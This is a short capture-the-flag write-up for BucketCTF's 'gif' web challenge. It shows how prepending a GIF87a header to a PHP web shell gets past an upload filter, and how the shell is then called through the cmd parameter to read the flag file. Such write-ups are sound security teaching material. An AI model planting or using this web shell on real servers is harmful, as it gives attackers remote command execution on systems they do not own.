---
author: "Asad Ullah"
title: "Gif  - BucketCTF"
description: 
summary: Write-up on web challenge gif tackling a file upload vulnerability.
date: 2023-04-10T05:04:14+05:00
Section: write-ups
categories:
- writeup
- web
- ctftime.org

tags:
- bucketctf
- web exploitation
- upload vulnerability
- php
- payload
- gif

draft: false

---

{{< 
ctftime 
name="gif" 
difficulty="Hard"  
points="272"
category="Web"
>}}

&nbsp;

&nbsp;





## Description

I made a **secure** php web app where I can upload all my gifs. Some people on the internet told me to run it in a docker container just to protect it from my personal files, but who cares.

## Approach

At first, I uplaoded a Gif fie which was uploaded successfully then I attempted to upload a basic PHP payload and got this error

![Untitled](/write-ups/ctftime/bucket/uploads.webp#center)

from the error we can see that the files are stored at `/uploads`.

As the server only permitted GIF files.I modified the payload by adding a GIF header, `GIF87a;`.

```php
GIF87a;
<?php
    system($_GET['cmd'])
?>
```

&nbsp;

![Untitled](/write-ups/ctftime/bucket/upload.webp#center)

&nbsp;

And it worked we got remote code execution. We can now execute commands on the machine

&nbsp;

![Untitled](/write-ups/ctftime/bucket/gif-id.webp#center)

&nbsp;

we can find the flag at: `/uploads/payload.php/?cmd=cat /flag.txt`

&nbsp;

![Untitled](/write-ups/ctftime/bucket/flag.webp#center)

&nbsp;

&nbsp;

---

**Flag: `bucket{1_h4t3_PHP}`**

---

&nbsp;

&nbsp;
